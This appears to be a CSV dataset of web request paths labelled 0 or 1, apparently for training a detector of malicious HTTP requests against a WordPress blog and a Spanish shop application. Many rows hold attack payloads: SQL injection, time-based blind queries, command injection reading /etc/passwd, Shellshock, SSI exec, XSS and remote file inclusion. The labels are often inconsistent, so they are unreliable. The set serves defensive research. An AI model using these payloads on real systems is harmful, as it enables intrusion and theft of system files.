text,label
/blog/wp-content/plugins/user-registration/assets/https%3A%5C%5C8501779237819759495.owasp.org/frontend/my-account.min.js?ver=1.8.2.1,0
/blog/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E/uploads/2020/04/ff237aac-eda3-37f9-8529-2cbfc90951b2-1024x682.jpg,0
/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/feed,0
/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/wp-content/plugins/user-registration/assets/js/frontend/lost-password.min.js?ver=1.8.2.1,0
/blog/index.php%26%26cat+%2Fetc%2Fpasswd/category/uncategorized,0
/blog/wp-content/plugins/user-registration/assets/%5Cjquery.validate.min.js/frontend/jquery.validate.min.js?ver=1.15.1,0
/blog/URL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/rerum-ut-error-ex-dolores-rerum/embed,0
/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=47&b1=a�adir+al+carrito,0
/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E/wp-content/uploads/2020/04/d2ac875b-15d8-3412-9205-17afbf0ba62d.jpg,0
/blog/%28%29+%7B+%3A%3B%7D%3B+echo+%27X-Powered-By%3A+ShellShock-Vulnerable%27/uploads/2020/04,1
/blog%22%3Bsleep+15%3B%22/wp-content/uploads/2020/04/f51dfb19-3fe8-380e-91a6-3912fdae661e-300x200.jpg,1
/blog+AND+1%3D1+--+/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur,1
/blog/index.php/page/2/?s=c%3A%2F,0
/blog/index.php+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/2020/03/29/distinctio-sequi-officiis-occaecati,1
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/blog/index.php/2020/03/27%25%27+AND+3801%3D3801+AND+%27%25%27%3D%27/qui-ratione-maxime-dolores-consequatur,1
/blog%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/index.php/author/hintz-cedrick/feed,0
/3651171/,0
/blog/index.php/tag/hic-quod-et-odit/feed%60cat+%2Fetc%2Fpasswd%60,0
/blog/wp-content/uploads%22/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db-300x200.jpg,1
"/tienda1/publico/registro.jsp?modo=registro&login=bartz&password=impunida&nombre=eliberto&apellidos=ba�os+peleij�&email=luke@barnizultravioleta.ar&dni=88597573d&direccion=calle+albacete,+83+&ciudad=nevada&cp=28794&provincia=ciudad+r/?.eal&ntc=4823016932298784&b1=registrar",1
/blog/index.php/2020/%28SELECT+%28CASE+WHEN+%282989%3D2989%29+THEN+SLEEP%285%29+ELSE+2989*%28SELECT+2989+FROM+INFORMATION_SCHEMA.CHARACTER_SETS%29+END%29%29/27/qui-ratione-maxime-dolores-consequatur,1
/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=85&cantidad=70&b1=a�adir+al+carrito,0
/blog/index.php%28/aliquam-odio-a-labore-magnam-quam-quis/embed,1
/blog/index.php/author/vbechtelar/feed%7C%7Ccat+%2Fetc%2Fpasswd,0
/blog/wp-includes/js/jquery/ui/Set-cookie%3A+Tamper%3D92da00d7-8ad1-4af6-8dc9-7055dc469c5f?ver=1.11.4,0
/blog/wp-includes/js/plupload.1,0
alisik-koller@coreserv.zm,0
/blog/wp-content/uploads/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/04/b476e717-efec-3b0d-80e9-13c6400a7702-300x240.png,0
/blog%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/23,1
/blog/index.php/2020/03/23%2CROW%282313%2C3947%29%3E%28SELECT+COUNT%28*%29%2CCONCAT%280x3a727a613a%2C%28SELECT+%28ELT%282313%3D2313%2C1%29%29%29%2C0x3a6172743a%2CFLOOR%28RAND%280%29*2%29%29x+FROM+%28SELECT+6581+UNION+SELECT+9861+UNION+SELECT+5849+UNION+SELECT+4375%29a+GROUP+BY+x%29/fuga-aut-recusandae-sed-dolor-quia/feed,1
/blog/wp-content/zApPX2299sS/2020/04/bdffa507-6fa1-380b-b720-116dfaf00c82-1024x682.jpg,0
"/tienda1/miembros/editar.jsp?modo=registro&login=annice&password=he76n106r&nombre=olimpio&apellidos=oliva+baranovsky&email=ratoff@institutoandaluzdelmar.ly&dni=98695672g&direccion=avda.+fuentenueva,+190,+5?e&ciudad=esparragosa+de+lares&cp=26329&provincia=tarragona&ntc=0570351860327087&b1=registrar",0
/blog/wp-content/themes%27+%2F+sleep%2815%29+%2F+%27/twentyseventeen,0
/javascript/back.vb,0
/blog/https%3A%2F%2F8501779237819759495.owasp.org/uploads/2020/04/aa129ea8-5161-37b5-acab-9d6386eeec9c.png,0
/%27/index.php/et-vel-qui-explicabo-autem-rerum-nisi/embed,1
/mirc-script/,1
/blog/wp-content/themes/twentyseventeen/assets/.svn,0
/blog/index.php/2020/04/04/HtTpS%3A%2F%2F8501779237819759495.owasp.org/2,0
/blog/index.php/c%3A%5C/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/feed,0
/blog/index.php/%2F/nulla-quisquam-est-ut-nemo,0
/blog/index.php/my-account%27%26cat+%2Fetc%2Fpasswd%26%27/user-logout?_wpnonce=14237a84a5,0
/blog/zApPX2583sS/js/jquery/ui/sortable.min.js?ver=1.11.4,0
/blog/wp-includes%22%26cat+%2Fetc%2Fpasswd%26%22/js/mediaelement,0
/blog/index.php/tag/pariatur-eum-illo/feed%26cat+%2Fetc%2Fpasswd%26,0
/blog/wp-content%22+%2F+sleep%2815%29+%2F+%22/uploads/2020/04/7eb06ef2-3782-3e6a-bb62-c705e86b2eee-300x200.jpg,0
/%5Cshortcode.min.js/wp-includes/js/shortcode.min.js?ver=4.9.5,0
/%5C%5C8501779237819759495.owasp.org/wp-includes,0
/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39/&cantidad=5&b1=a�adir+al+carrito,1
/blog/wp-content/uploads/2020/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143.orig,0
/blog%7Ccat+%2Fetc%2Fpasswd%23/wp-content/themes/twentyseventeen/assets/images/header.jpg,0
/blog/index.php/2020/03/27%25%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/qui-ratione-maxime-dolores-consequatur/feed,1
fabra vicente,0
/blog/index.php/2020%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26,0
/blog+OR+1%3D1/wp-content/uploads/2020/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143-1024x682.jpg,1
/blog%27+%2F+sleep%2815%29+%2F+%27/wp-content/plugins/user-registration/assets/js/frontend/user-registration.min.js?ver=1.8.2.1,0
/blog/index.php%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/2020/03/23,1
/blog/index.php/my-account/user-logout/?_wpnonce=HtTp%3A%2F%2F8501779237819759495.owasp.org,0
/blog/index.php/my-account/%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C/%7B%7B%20data.sizes.medium.url%20%7D%7D,1
83817692b,0
/javascript/24.rb,0
/8501779237819759495.owasp.org/wp-content/themes,0
/a4183190/,0
/norfolk_usa/,0
/blog/wp-content/themes/twentyseventeen/assets/css/ie8.css%27+where+0+in+%28select+sleep%2815%29+%29+--+?ver=1.0,1
/blog/index.php/my-account/edit-password/ username=superiorSausage1&password=0-2E8-pl&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,1
/blog/wp-content/uploads/2020/04/backup4b6aa405-8ac7-33d8-9366-43fcef53f97a-300x239.png,0
/blog/wp-login.php log=dearThrush0&pwd=AknbF5w&&rememberme=forever&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fwp-admin%2Fprofile.php&testcookie=1,1
d5sm7lad7,0
/blog/index.php/2020/04/04/,0
/blog%2526%2526cat%2B%252Fetc%252Fpasswd/index.php/my-account/edit-profile/%7B%7B%20attachment.thumbnail.url%20%7D%7D,1
/blog/wp-content/uploads/2020/04%26%26cat+%2Fetc%2Fpasswd/48cf902e-a565-3e60-8512-c19e2e6a72db-300x200.jpg,0
/blog/index.php/https%3A%5C%5C8501779237819759495.owasp.org/03/29/distinctio-sequi-officiis-occaecati/feed,0
/blog/index.php/2020+OR+1%3D1/04/04/nihil-tenetur-et-ad-in-dolores/embed,1
/050251/,0
/blog/index.php/2020/03/23%22%29+AND+EXTRACTVALUE%285087%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28ELT%285087%3D5087%2C1%29%29%29%2C0x3a6172743a%29%29+AND+%28%22HtPm%22%3D%22HtPm/fuga-aut-recusandae-sed-dolor-quia/embed,1
/blog/index.php/2020/03/22%25%27%29+AND+8957%3D8957+AND+%28%27%25%27%3D,1
/blog/wp-content%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063-300x240.png,0
/blog%3Bcat+%2Fetc%2Fpasswd%3B/wp-includes/js/json2.min.js?ver=2015-05-03,0
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur+UNION+ALL+SELECT+NULL%2CNULL%23,1
/blog/%22%27/uploads/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3.jpg,1
/blog/c%3A%5C/my-account/edit-password password_current=AxNF1ms&password_1=AxNF1ms&password_2=AxNF1ms&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,0
torrie,0
/https%3A%2F%2F8501779237819759495.owasp.org/wp-content/themes/twentyseventeen/assets/js/global.js?ver=1.0,0
/blog%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03,1
/blog/index.php/my-account/edit-profile/?mode=grid username=unhappyOatmeal2&password=#CrH!U&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F%3Fmode%3Dgrid&login=Login&redirect=&rememberme=forever,1
/blog/HtTp%3A%2F%2F8501779237819759495.owasp.org/tag/nihil-ut-deleniti-est,0
/blog/wp-content/uploads/2020%27+%2F+sleep%2815%29+%2F+%27/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9-1024x682.jpg,0
/blog/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem%22+%2F+sleep%2815%29+%2F+%22/embed,0
/blog%26cat+%2Fetc%2Fpasswd%26/wp-content/uploads/2020/04/e3780f73-5198-35c8-8ece-d2d4feda884e-1024x682.jpg,0
/blog/wp-content/uploads/2020/http%3A%5C%5C8501779237819759495.owasp.org/aa129ea8-5161-37b5-acab-9d6386eeec9c.png,0
/blog/wp-includes/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/dashicons.min.css?ver=4.9.5,0
/blog/wp-content/uploads/2020/04/40ce1958-204f-369e-bc5a-32d63da4963f.bac.png,0
/blog/wp-content/uploads/814f0d47-97c4-3681-b8a4-2cd7f3a93119.jpg/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119.jpg,0
/blog/wp-content/uploads/2020/04/f51dfb19-3fe8-380e-91a6-3912fdae661e~.jpg,0
/icon_mpeg061405/,0
/blog/wp-content/plugins%27%3Bcat+%2Fetc%2Fpasswd%3B%27/user-registration/assets/js/inputmask/jquery.inputmask.bundle.min.js?ver=4.0.0-beta.58,0
/blog%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/embed,1
/%00/index.php/tag/autem-vel-nostrum-enim/feed,0
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed%25%27%29+UNION+ALL+SELECT+NULL--+-,1
/blog/index.php/tag/nihil-ut-deleniti-est/feed%26cat+%2Fetc%2Fpasswd%26,0
/financial-img/,0
/mm_assets/,0
/blog/wp-content/HtTpS%3A%2F%2F8501779237819759495.owasp.org/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063-300x240.png,0
/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidad=69&b1=a�adir+al+carritobob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
/blog/wp-content/%40/2020/04/40ce1958-204f-369e-bc5a-32d63da4963f-300x240.png,0
/cat_wine/,0
/blog%25%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog/wp-content/c%3A%5C/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063-300x240.png,0
/blog/index.php%22%3Bcat+%2Fetc%2Fpasswd%3B%22/2020/04/04/voluptatum-reprehenderit-maiores-ab-sequi-quaerat/feed,0
/blog/index.php/search%22+OR+%221%22%3D%221%22+--+/feed/feed,1
/auth.sessions.inc.php?da_path=http://192.168.202.96:8080/llumt7msyau5y?,0
hargrow2,0
"/main.php?stuff=""ping\xa0-w\xa010000\xa0-n\xa01\xa04.3.2.1|rem\xa0",1
/blog/index.php%29+AND+EXTRACTVALUE%282501%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28ELT%282501%3D2501%2C1%29%29%29%2C0x3a6172743a%29%29+AND+%283841%3D3841/2020,1
/8501779237819759495.owasp.org/wp-login.php?loggedout=true,0
/blogNULL/wp-content/uploads/2020/04/7c651b11-3631-3f9e-b728-dc11efe811c7.png,1
/blog/%2B/2020/04/04/ipsa-ea-porro-distinctio,0
/rf2_2k/,0
/c%3A%2F/index.php/wp-json/oembed/1.0,0
/blog/wp-login.php?action=register user_login=ferventMare8&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,0
/blog/wp-content/plugins/%5Cjs/assets/js,0
/blog/index.php/2020/03/%28SELECT+%28CASE+WHEN+%285269%3D5269%29+THEN+%27+ELSE+5269*%28SELECT+5269+FROM+INFORMATION_SCHEMA.CHARACTER_SETS%29+END,1
/blog/wp-content/uploadsNULL/2020/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119-1024x682.jpg,1
/blog/index.php/my-account/edit-profile/?mode=grid%27+OR+%271%27%3D%271%27+--+ username=sheepishSalami7&password=4RkGUp&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F%3Fmode%3Dgrid&login=Login&redirect=&rememberme=forever,1
/blog%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur,1
/blog/wp-content/uploads/2020/04/ff237aac-eda3-37f9-8529-2cbfc90951b2-1024x682.jpg+OR+1%3D1,1
/blog/wp-includes/js/jquery/ui/core.min.js?ver=0W45pz4p,0
/blog%27+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29dtSk%29+AND+%27TXPx%27%3D%27TXPx/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog/index.php/sample-page/amet-et-deleniti-tenetur-minima%26%26cat+%2Fetc%2Fpasswd/feed,0
/blog/wp-content/uploads/2020/%5C%5C8501779237819759495.owasp.org/6e5c5163-fca7-365f-898b-acced7ed5063-300x240.png,0
/blog+AND+1%3D1+--+/wp-content/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563.jpg,1
/recordings/theme/images/r57.php,0
/blog/wp-login.php?_wpnonce=7de0abcdc2&action=%28&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fregistration,0
/blog/wp-content/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db.jpg,0
/blog%26%26sleep+15/wp-content/uploads/2020/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-180x180.jpg,1
/blog/wp-includes/js/jquery/ui%27+OR+%271%27%3D%271%27+--+,1
"/tienda1/miembros/editar.jsp?modo=registro&login=shrieves&password=p6l1s0&nombre=higinia&apellidos=torrens+lemus&email=knepper@pavimentosalagon.gm&dni=92145454w&direccion=calle+vidrieria+196,+3?f&ciudad=fonfr�a&cp=09258&provincia=madrid&ntc=3401704245794474&b1=registrar",0
/blog/wp-includes/js/jquery/ui%26%26cat+%2Fetc%2Fpasswd/core.min.js?ver=1.11.4,0
/blog/index.php/2020/page+OR+1%3D1+--+/2,1
/blog/index.php/2020/04%27+%2F+sleep%2815%29+%2F+%27/04/ipsa-repellat-dignissimos-laudantium/embed,0
/blog/wp-login.php?action=HtTpS%3A%2F%2F8501779237819759495.owasp.org user_login=ecstaticTruffle7&redirect_to=&wp-submit=Get+New+Password,0
/file215/,0
/blog/index.php/2020/04+AND+1%3D2/04/consequatur-ad-error-quidem,1
/Set-cookie%3A+Tamper%3D1f4208f9-9b56-4540-b4ab-9e7ad7106bc8/index.php,0
/blog/wp-content/plugins/user-registration/assets0W45pz4p/js/frontend/user-registration.min.js?ver=1.8.2.1,0
"/tienda1/publico/registro.jsp?modo=registro&login=price&password=enlucimiento&nombre=roldan&apellidos=kisines+selvas&email=sverdlin@cortinasartesol.gl&dni=57845890q&direccion=muelle+ca�onero+dato,+s/n+6-g&ciudad=luisiana,+la&cp=10811&provincia=na.varra&ntc=1813562312950494&b1=registrar",1
/blog/index.php/2020+%2F+sleep%2815%29+/04/04/consequatur-ad-error-quidem/feed,0
/blog/wp-content/c%3A%5C/2020/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143-1024x682.jpg,0
/blog/wp-includes/css0W45pz4p/wp-embed-template-ie.min.css?ver=4.9.5,0
/blog%27+%2F+sleep%2815%29+%2F+%27/index.php/tag/autem-vel-nostrum-enim,0
/blog/index.php/2020/04%7Ccat+%2Fetc%2Fpasswd%23/04/vero-nihil-nam-numquam-ullam-quas/feed,0
/blog/wp-content/uploads/2020/04/ff237aac-eda3-37f9-8529-2cbfc90951b2.jpg.orig,0
/blog/wp-content/uploads/2020/04/65521cc1-512f-3af5-a40c-ad52a8de6f29.zip,0
/blog%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/wp-content/themes/twentyseventeen/assets/%2B/global.js?ver=1.0,0
/blog/index.php/2020/04%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/04/animi-sint-ut-sed-commodi/feed,0
/tienda1/publico/autenticar.jsp?modo=entrar&login=anupam&pwd=ca96hue25&remember=off&b1=entrar,0
/blog/wp-content/plugins/user-registration/assets%26%26sleep+15/js/frontend/user-registration.min.js?ver=1.8.2.1,1
/blog/wp-content/uploads/%2Fc357e14e-0af5-317e-a4f7-bc609b90087b-300x200.jpg/04/c357e14e-0af5-317e-a4f7-bc609b90087b-300x200.jpg,0
/https%253A%252F%252F8501779237819759495.owasp.org/index.php/my-account/edit-profile/%7B%7B%20data.editLink%20%7D%7D&image-editor,1
/1004359901/,0
/blog/wp-content/plugins/user-registration/assets/js/inputmask%20-%20Copy%20(2),0
/blog/wp-includes/js/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C?ver=1.8.3,0
/blog/wp-includes/js%7Csleep+15%23/plupload/wp-plupload.min.js?ver=4.9.5,1
/genderol/,0
/blog/index.php/2020/03/22+RLIKE+%28SELECT+%28CASE+WHEN+%287079%3D7079%29+THEN+22+ELSE+0x28+END%29%29/quidem-rerum-sit-doloribus-quia-eum,1
/blog/https%3A%5C%5C8501779237819759495.owasp.org/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed,0
coomonte,0
/blog%27%3Bcat+%2Fetc%2Fpasswd%3B%27/index.php/2020/04/04/page/2,0
/%7C/wp-includes/css/media-views.min.css?ver=4.9.5,0
/blog/index.php/comments/feed%27%26cat+%2Fetc%2Fpasswd%26%27,0
/blog/index.php/2020+%2F+sleep%2815%29+/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/embed,0
/blog/wp-includes/js/plupload%26sleep%24mc+15%26/plupload.min.js?ver=2.1.9,1
/blog/index.php/wp-json/%27,1
/youngonesthe_1299003473/,0
/blog/wp-content/themes/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E/assets/js/navigation.js?ver=1.0,0
/blog+%2F+sleep%2815%29+/index.php/2020/04/page/2,0
/blog/index.php/http%3A%2F%2F8501779237819759495.owasp.org/04/04/consequatur-ad-error-quidem/feed,0
/blog/wp-content/plugins/%40/assets/css/user-registration.css?ver=1.8.2.1,0
/blog/wp-includes/css/media-views.min.css%22%26sleep+15%26%22?ver=4.9.5,1
/blog%25/wp-content/plugins/user-registration/assets/css/user-registration-smallscreen.css?ver=1.8.2.1,0
/administrator/components/com_rssreader/admin.rssreader.php?mosconfig_live_site=http://192.168.202.96:8080/llumt7msyau5y?,0
/blog/index.php%25/2020/04/04/voluptatum-reprehenderit-maiores-ab-sequi-quaerat/embed,0
/blog/index.php/2020/04/04/vero-nihil-nam-numquam-ullam-quas/%22,1
/blog/index.php/author%22+where+0+in+%28select+sleep%2815%29+%29+--+/hintz-cedrick/feed,1
/blog%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/wp-content/uploads/2020/04/7c651b11-3631-3f9e-b728-dc11efe811c7-300x240.png.bac,0
/blog%7C%7Ccat+%2Fetc%2Fpasswd/index.php/author/rosenbaum-lisette/feed,0
/blog/wp-content/uploads/2020/04/aa129ea8-5161-37b5-acab-9d6386eeec9c.png%22,1
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed%22+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-,1
/blog/index.php/2020/03/23%22%29+AND+9636%3D2624+AND+%28%22mgkp%22%3D%22mgkp/fuga-aut-recusandae-sed-dolor-quia,1
/blog/wp-content%27%29+UNION+ALL+select+NULL+--+/uploads/2020/04/40ce1958-204f-369e-bc5a-32d63da4963f-300x240.png,1
/blog/index.php+ORDER+BY+1--+-/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/%2F%2F8501779237819759495.owasp.org/wp-includes/js/admin-bar.min.js?ver=4.9.5,0
/blog/c%3A%2F/themes,0
/NULL/wp-content/uploads/2020/04/c88a75c6-b439-3e82-99dd-0aca7c568b15.jpg,1
/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E/wp-content/uploads/2020,0
/blog/index.php%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/23,1
/http%3A%5C%5C8501779237819759495.owasp.org/index.php/2020/04/04/labore-pariatur-amet-quam/feed,0
/blog/wp-content/uploads/https%3A%5C%5C8501779237819759495.owasp.org/04/27f17687-adda-3ce6-9767-0037ea74eec2.png,0
/0W45pz4p/index.php/2020/04/04/animi-sint-ut-sed-commodi/feed,0
/blog/wp-includes+AND+1%3D1+--+/js/jquery/ui/core.min.js?ver=1.11.4,1
/blog%22+where+0+in+%28select+sleep%2815%29+%29+--+/index.php/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/feed,1
/blog/index.php/2020/03%27+and+0+in+%28select+sleep%2815%29+%29+--+/22/quidem-rerum-sit-doloribus-quia-eum/feed,1
"-5891) where 5792=5792 union all select 5792,5792,5792,5792,5792#",1
/blog/wp-content/uploads/2020/04/4f93f7ba-7b14-35e1-b3b0-df18897c5111.png.7z,0
/blog/wp-content/uploads/2020/04/f74331ba-6a7e-37cc-aefe-7026be7b0c0b.log.png,0
/blog/index.php/2020/03/27%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26,0
/blog/index.php/my-account/%2522%253E%253C%2521--%2523EXEC%2Bcmd%253D%2522ls%2B%252F%2522--%253E%253C/%7B%7B%20data.url%20%7D%7D,1
/blog/index.php/2020+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/03/23,1
/blog/wp-content/0W45pz4p/twentyseventeen/assets/js/jquery.scrollTo.js?ver=2.1.2,0
/HtTp%3A%2F%2F8501779237819759495.owasp.org/wp-includes/css/dashicons.min.css?ver=4.9.5,0
/blog/wp-content/%2Fetc%2Fpasswd/user-registration/assets/css/sweetalert2,0
/blog/wp-content/themes/twentyseventeen/assets/js/navigation.js.orig,0
/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E/index.php/aut-velit-dicta-eaque,0
/blog/wp-includes/%5C%5C8501779237819759495.owasp.org/media-views.min.css?ver=4.9.5,0
/blog%22+%2F+sleep%2815%29+%2F+%22/wp-content/uploads/2020/04/aa129ea8-5161-37b5-acab-9d6386eeec9c.png,0
/blog/index.php/author/hintz-cedrick/feed/,0
/blog%27%29%29+RLIKE+%28SELECT+%28CASE+WHEN+%285358%3D5358%29+THEN+0x626c6f67+ELSE+0x28+END%29%29+AND+%28%28%27xtsW%27%3D%27xtsW/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog%27+and+0+in+%28select+sleep%2815%29+%29+--+/index.php/my-account/edit-profile/post.php?action=edit&post=%7B%7B%20data.id%20%7D%7D username=gleefulSeafowl3&password=MjbHoqoO&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever,1
/blog/xmlrpc.php,0
/blog/index.php/2020/03/23/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/embed,0
/blog/wp-content/uploads/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/04/bdffa507-6fa1-380b-b720-116dfaf00c82-1024x682.jpg,0
/blog/wp-content/uploads/2020/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119.jpg%26cat+%2Fetc%2Fpasswd%26,0
